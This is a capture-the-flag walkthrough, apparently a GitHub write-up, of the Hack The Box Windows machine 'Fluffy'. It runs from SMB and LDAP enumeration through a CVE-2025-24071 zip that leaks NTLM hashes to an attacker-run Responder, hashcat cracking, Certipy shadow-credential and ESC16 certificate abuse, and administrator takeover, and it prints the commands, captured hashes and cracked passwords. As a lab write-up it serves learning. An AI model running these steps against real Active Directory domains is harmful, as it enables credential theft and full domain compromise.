
![Fluffy](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Fluffy/Assets/Pasted%20image%2020250727232856.png)


### Machine Information

As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!


### Nmap Scan Result
```kali-terminal
┌──(kali㉿kali)-[~/Desktop/HTB_Machines]
└─$ nmap -sC -sV 10.10.11.69     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 18:29 PST
Nmap scan report for 10.10.11.69 (10.10.11.69)
Host is up (0.16s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-27 17:30:48Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-27T17:32:09+00:00; +7h00m47s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-07-27T17:32:10+00:00; +7h00m47s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-07-27T17:32:09+00:00; +7h00m47s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-27T17:32:10+00:00; +7h00m47s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-27T17:31:33
|_  start_date: N/A
|_clock-skew: mean: 7h00m47s, deviation: 0s, median: 7h00m46s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.80 seconds
```


Add the IP address in the /etc/hosts using nano
```bash
sudo nano /etc/hosts

# Add this line in the /etc/hosts
10.10.11.69     dc01.fluffy.htb
```

Using the provided Credentials, enumerate the machine using NetExec:
```kali-terminal
┌──(kali㉿kali)-[~/Desktop/HTB_Machines/Fluffy]
└─$ nxc ldap 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --computers                                       
LDAP        10.10.11.69     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
LDAP        10.10.11.69     389    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
LDAP        10.10.11.69     389    DC01             [*] Total records returned: 1
LDAP        10.10.11.69     389    DC01             DC01$
```

```kali-terminal

┌──(kali㉿kali)-[~/Desktop/HTB_Machines/Fluffy]
└─$ nxc ldap 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --computers --users
LDAP        10.10.11.69     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
LDAP        10.10.11.69     389    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
LDAP        10.10.11.69     389    DC01             [*] Enumerated 9 domain users: fluffy.htb
LDAP        10.10.11.69     389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.10.11.69     389    DC01             Administrator                 2025-04-17 23:45:01 0        Built-in account for administering the computer/domain      
LDAP        10.10.11.69     389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.10.11.69     389    DC01             krbtgt                        2025-04-18 00:00:02 0        Key Distribution Center Service Account                     
LDAP        10.10.11.69     389    DC01             ca_svc                        2025-04-18 00:07:50 0                                                                    
LDAP        10.10.11.69     389    DC01             ldap_svc                      2025-04-18 00:17:00 0                                                                    
LDAP        10.10.11.69     389    DC01             p.agila                       2025-04-18 22:37:08 0                                                                    
LDAP        10.10.11.69     389    DC01             winrm_svc                     2025-05-18 08:51:16 0                                                                    
LDAP        10.10.11.69     389    DC01             j.coffey                      2025-04-19 20:09:55 2                                                                    
LDAP        10.10.11.69     389    DC01             j.fleischman                  2025-05-16 22:46:55 0                                                                    
LDAP        10.10.11.69     389    DC01             [*] Total records returned: 1
LDAP        10.10.11.69     389    DC01             DC01$
```

I ran 'smbmap' to check for shares and sure enough we got 'IT' as shown below:
```kali-terminal
┌──(kali㉿kali)-[~/Desktop/HTB_Machines]
└─$ smbmap -H 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.10.11.69:445 Name: fluffy.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ, WRITE
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections
```


We enter the smb share via smb client.
```kali-terminal
┌──(kali㉿kali)-[~/Desktop/HTB_Machines/Fluffy]
└─$ smbclient //fluffy.htb/IT -U j.fleischman
Password for [WORKGROUP\j.fleischman]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon May 19 22:27:02 2025
  ..                                  D        0  Mon May 19 22:27:02 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 23:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 23:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 23:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 23:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 22:31:07 2025

                5842943 blocks of size 4096. 1545231 blocks available
```

The interesting file here is the 'Upgrade_Notice.pdf' this file contains CVE information that is helpful in gaining access to the machine.

![Fluffy_CVE](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Fluffy/Assets/Pasted%20image%2020250728001245.png)


### CVE-2025-24071

I focused on the Critical once and I found that CVE-2025-24071 is the most possible exploit we can use to gain access to the machine.

You can read more about the Exploit and CVE using this link:
https://github.com/0x6rss/CVE-2025-24071_PoC

I cloned it in my machine:
```
┌──(kali㉿kali)-[~/Desktop/HTB_Machines/Fluffy]
└─$ git clone https://github.com/0x6rss/CVE-2025-24071_PoC.git
Cloning into 'CVE-2025-24071_PoC'...
remote: Enumerating objects: 18, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 18 (delta 4), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (18/18), 6.30 KiB | 6.30 MiB/s, done.
Resolving deltas: 100% (4/4), done.
```

Then run it using this command:
```bash
python3 poc.py                                               
Enter your file name: documents
Enter IP (EX: 192.168.1.162): 10.10.14.37
completed
```

After that, it will generate a file named 'exploit.zip'. We'll need to upload it in the SMB share using the 'put' command.

```bash
smb: \> put exploit.zip
putting file exploit.zip as \exploit.zip (0.7 kb/s) (average 0.7 kb/s)
```

Before putting it, make sure to run the responder to capture the hashes.

```bash
┌──(kali㉿kali)-[~/Desktop/HTB_Machines/Fluffy]
└─$ sudo responder -I tun0 -wvF                                
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.6.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
```

And soon enough, we'll get the a result.
```bash
[+] Listening for events...                                                                                                                                                                                                                 

[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:7a095dbd234dde6b:EEDF03B2DC7B10C60F765429E1E4BE14:010100000000000080179C7B2DFFDB013935DA89E45722E30000000002000800530056004800470001001E00570049004E002D004B005100440046004C004F0032004A005A005200550004003400570049004E002D004B005100440046004C004F0032004A005A00520055002E0053005600480047002E004C004F00430041004C000300140053005600480047002E004C004F00430041004C000500140053005600480047002E004C004F00430041004C000700080080179C7B2DFFDB0106000400020000000800300030000000000000000100000000200000B5B172D7FAA47FC00765001AA8D4E5A8EC3DF0D185A268A87C8BA2BE28FBCEE60A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330037000000000000000000
```

As soon as I get the hash, I stored it in a .txt file then ran hashcat to crack it.

```hashcat
hashcat -m 5600 pagila_hash.txt /usr/share/wordlists/rockyou.txt
```

```hashcat-result
P.AGILA::FLUFFY:40295db4e05f0fbd:e88aafc1204c91bf234fc45f21b434dd:010100000000000080179c7b2dffdb01f1664b4115a4ca510000000002000800530056004800470001001e00570049004e002d004b005100440046004c004f0032004a005a005200550004003400570049004e002d004b005100440046004c004f0032004a005a00520055002e0053005600480047002e004c004f00430041004c000300140053005600480047002e004c004f00430041004c000500140053005600480047002e004c004f00430041004c000700080080179c7b2dffdb0106000400020000000800300030000000000000000100000000200000b5b172d7faa47fc00765001aa8d4e5a8ec3df0d185a268a87c8ba2be28fbcee60a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00330037000000000000000000:prometheusx-303
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: P.AGILA::FLUFFY:40295db4e05f0fbd:e88aafc1204c91bf23...000000
Time.Started.....: Sun Jul 27 20:05:25 2025 (11 secs)
Time.Estimated...: Sun Jul 27 20:05:36 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   466.3 kH/s (0.87ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4517888/14344386 (31.50%)
Rejected.........: 0/4517888 (0.00%)
Restore.Point....: 4516864/14344386 (31.49%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: promo19972003 -> progres2007
Hardware.Mon.#1..: Util: 37%

Started: Sun Jul 27 20:04:59 2025
Stopped: Sun Jul 27 20:05:37 2025
```

There we go. We got the user 'p.agila' and a password which is 'prometheusx-303'.

Now we can run bloodhound to map out the AD environment. First, load up bloodhound and then get the json files from the AD environment using the credentials that we have.

```
┌──(kali㉿kali)-[~/Desktop/HTB_Machines/Fluffy/Blood]
└─$ bloodhound-python -u p.agila -p 'prometheusx-303' -ns 10.10.11.69 -d fluffy.htb -c all
```

Once the command has finished, we'll upload it in our bloodhound using our browser. Click the upload button and proceed to the directory where the json files are saved then upload them here. Once the ingestion was complete, we can now query in the explore section.
<!--![[2025-07-28_01-11.png]]-->
![Fluffy](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Fluffy/Assets/2025-07-28_01-11.png)



'p.agila' can write itself in the Service Accounts.
<!--![[Pasted image 20250728010155.png]]-->
![Fluffy](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Fluffy/Assets/Pasted%20image%2020250728010155.png)


And Service Accounts has write permissions to 'CA_SVC'.

![Fluffy_Pasted image 20250728010333.png](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Fluffy/Assets/Pasted%20image%2020250728010333.png)

Since 'p.agila' can write itself in the Service Accounts, we'll run bloodyAD to do this.
```
┌──(kali㉿kali)-[~/Desktop/HTB_Machines/Fluffy/bloodyAD]
└─$ bloodyAD --host '10.10.11.69' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303'  add groupMember 'SERVICE ACCOUNTS' p.agila
```

After that, we'll run certipy-ad.
```
faketime '2025-07-28 05:34:30'  certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303'  -account 'WINRM_SVC'  -dc-ip '10.10.11.69'
```

![Fluffy_2025-07-28_01-24.png](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Fluffy/Assets/2025-07-28_01-24.png)

Command Explanation (Disclaimer: This is new to me so this explanation is from perplexity.ai):
This command above does the following in one automated operation using Certipy's shadow credentials feature:

- **Shadow Credentials attack:** Certipy "shadow auto" adds a temporary certificate-based credential (a "Key Credential") to the target account specified by `-account 'WINRM_SVC'`.
    
- It uses the user credentials `p.agila@fluffy.htb` and password `prometheusx-303` to authenticate with the Domain Controller at `10.10.11.69`.
    
- The command then automatically authenticates as the target account (`WINRM_SVC`) using the newly added certificate credential, retrieves that account's NT hash and a Kerberos Ticket Granting Ticket (TGT) for it.
    
- After successfully authenticating and obtaining credentials for `WINRM_SVC`, Certipy automatically removes the temporary Key Credential to clean up traces.
    
- Running the command prefixed by `faketime '2025-07-28 05:34:30'` ensures the system time is temporarily spoofed to avoid Kerberos clock skew issues during this attack.
    

In summary, this command performs a stealthy, automated certificate-based takeover of the `WINRM_SVC` account by leveraging shadow credentials, authenticates as that account to extract credentials, and then restores the environment to avoid detection.

This attack exploits the **msDS-KeyCredentialLink** attribute on the target's AD object to add and use certificate credentials without setting or resetting passwords, which helps maintain stealth and persistence.


### User Flag

Now that we got the hash, we'll need to gain access to the machine via evil-winrm. Navigate to the Desktop and get the user flag.

![Fluffy_2025-07-28_01-27.png](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Fluffy/Assets/2025-07-28_01-27.png)


### Privilege Escalation
Upon research, I stumbled upon this github link: https://github.com/ly4k/Certipy/wiki/06-%e2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally

This is a #ESC16: Security Extension Disabled on CA (Globally) Vulnerability. To escalate our privileges, we'll use the following commands:

```
┌──(kali㉿kali)-[~/Desktop/HTB_Machines/Fluffy]
└─$ faketime '2025-07-28 05:56:13' certipy-ad shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -account 'ca_svc' auto
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'c6b66bbe-c754-6795-34f4-b24f75a2090f'
[*] Adding Key Credential with device ID 'c6b66bbe-c754-6795-34f4-b24f75a2090f' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'c6b66bbe-c754-6795-34f4-b24f75a2090f' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/HTB_Machines/Fluffy]
└─$ export KRB5CCNAME=ca_svc.ccache
```


### Explanation:

Command:

```bash

`faketime '2025-07-28 05:56:13' certipy-ad shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -account 'ca_svc' auto`
```

What it does:

- **`faketime '2025-07-28 05:56:13'`**:  
    Temporarily spoofs the system clock for this command to the specified date/time. This prevents Kerberos clock skew errors, which require your attacker machine's time to closely match the Domain Controller's time.
    
- **`certipy-ad shadow`**:  
    Runs Certipy’s **shadow credentials** attack feature. This attack targets the Active Directory account specified with `-account` to add a temporary certificate-based credential.
    
- **`-u 'p.agila@fluffy.htb' -p 'prometheusx-303'`**:  
    The username and password of an account (in this case `p.agila`) that has sufficient rights to add certificate credentials to other accounts in the domain.
    
- **`-dc-ip '10.10.11.69'`**:  
    The IP address of the Domain Controller to communicate with.
    
- **`-account 'ca_svc'`**:  
    The target AD user account that Certipy will add a shadow (certificate) credential to and attempt to authenticate as.
    
- **`auto`**:  
    Automates the entire process: add the certificate credential, authenticate using it, extract hash and ticket, then clean up by removing the added credential.
    

### Output Explained:

- **Targeting user 'ca_svc'**:  
    Certipy will act on this account.
    
- **Generating certificate & Key Credential**:  
    Certipy creates a temporary certificate and key credential that will be added to `ca_svc`'s AD object in the **msDS-KeyCredentialLink** attribute.
    
- **DeviceID 'c6b66bbe-c754-6795-34f4-b24f75a2090f'**:  
    A unique ID for the added key credential.
    
- **Adding Key Credential... Successfully added**:  
    Certipy modifies the AD account `ca_svc` to add this certificate credential. This allows authenticating as `ca_svc` using PKINIT (certificate-based Kerberos authentication).
    
- **Authenticating as 'ca_svc' with the certificate**:  
    Certipy tries to obtain a **Kerberos Ticket Granting Ticket (TGT)** for `ca_svc` using the newly added certificate credential.
    
- **No identities found in this certificate**:  
    A general informational message related to certificate contents; can be normal.
    
- **Using principal: '[ca_svc@fluffy.htb](mailto:ca_svc@fluffy.htb)'**:  
    Shows what Kerberos principal it’s authenticating with.
    
- **Got TGT**:  
    Authentication succeeded and Certipy obtained a valid Kerberos TGT for `ca_svc`. This confirms you can now act as `ca_svc` within the domain.
    
- **Saving credential cache to 'ca_svc.ccache'**:  
    Certipy saves the Kerberos ticket cache (containing the TGT) to the file `ca_svc.ccache` for later use.
    
- **Trying to retrieve NT hash for 'ca_svc'**:  
    Certipy attempts to get the NT hash (password hash) for `ca_svc`. This is useful for password or pass-the-hash attacks later.
    
- **Restoring the old Key Credentials for 'ca_svc'**:  
    Certipy removes the temporary certificate credential it added, cleaning up and avoiding detection.
    
- **NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8**:  
    Shows the extracted NT hash of the `ca_svc` account.

### Next Command:

```bash
`export KRB5CCNAME=ca_svc.ccache`
```

- Sets the environment variable `KRB5CCNAME` to point to the credential cache file `ca_svc.ccache` saved earlier.
    
- This tells Kerberos-aware tools (like `kinit`, `impacket`, `evil-winrm`, or others) to use this ticket cache for authentication automatically, effectively allowing you to use that Kerberos ticket to authenticate as `ca_svc` without needing the password.


## 1. Requesting a Certificate

![Fluffy_2025-07-28_01-56.png](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Fluffy/Assets/2025-07-28_01-56.png)

```bash
faketime '2025-07-28 05:56:13' certipy-ad req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'
```


- **Purpose:** Requests a certificate from the AD CS running on `10.10.11.69` (the domain controller).
    
- `-k` means to use Kerberos authentication.
    
- `-target` specifies the host for which you are requesting the cert; here `DC01.FLUFFY.HTB`.
    
- `-ca` specifies the Certificate Authority name (`fluffy-DC01-CA`).
    
- `-template` specifies the certificate template to use; in this case, the generic `User` template.
    
- The command uses `faketime` to spoof the system date/time to avoid Kerberos clock skew issues.
    
- The output indicates the certificate request succeeded.
    
- The resulting certificate is saved to `administrator.pfx`.
    
- The note about "Certificate has no object SID" suggests that the certificate might lack a Security Identifier related to the object; it recommends potentially setting the SID with `-sid` if needed.



## 2. Updating the Account with a User Principal Name

![Fluffy_2025-07-28_02-00.png](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Fluffy/Assets/2025-07-28_02-00.png)

```bash
faketime '2025-07-28 06:02:49' certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
```

- **Purpose:** Updates attributes of the AD user account `ca_svc`.
    
- The credentials used are `p.agila@fluffy.htb` (the user you compromised or with delegated rights).
    
- The update specifically sets the User Principal Name (UPN) of `ca_svc` to `ca_svc@fluffy.htb`.
    
- This action can be important for some Kerberos or certificate-based attacks, ensuring the UPN matches expected values.
    
- The output confirms the update was successful.
    

## 3. Authenticating Using the Certificate

![Fluffy_2025-07-28_02-02.png](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Fluffy/Assets/2025-07-28_02-02.png)

```bash
faketime '2025-07-28 06:09:47' certipy-ad auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
```

- **Purpose:** Uses the previously requested certificate (`administrator.pfx`) to authenticate to the domain controller.
    
- The username is given as `administrator`, which should correspond in some way to the `UPN` or identity in the certificate.
    
- It uses Kerberos PKINIT authentication backed by the certificate.
    
- The output indicates:
    
    - The certificate contains a UPN `administrator`.
        
    - Kerberos Ticket Granting Ticket (TGT) has been successfully obtained.
        
    - The TGT cache is saved in `administrator.ccache`.
        
    - It successfully retrieved the NT hash for the `administrator` account, which can be used for further lateral movement or privilege escalation.
        

## Summary

This sequence demonstrates a common AD CS abuse workflow during Active Directory pentesting or red teaming:

1. **Request a certificate** for a user (here, the administrator).
    
2. **Update the user’s AD attributes** if necessary to ensure smooth authentication (e.g., make sure UPN is set correctly).
    
3. **Authenticate with the obtained certificate** to get Kerberos tickets and possibly extract credentials.
    

With this, you effectively gain strong authentication material for the administrator account without needing their password.



### Root Flag

Now that we got the administrator hash, we can now login as administrator and get the root flag in the Desktop.

![Fluffy_2025-07-28_02-03.png](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Fluffy/Assets/2025-07-28_02-03.png)
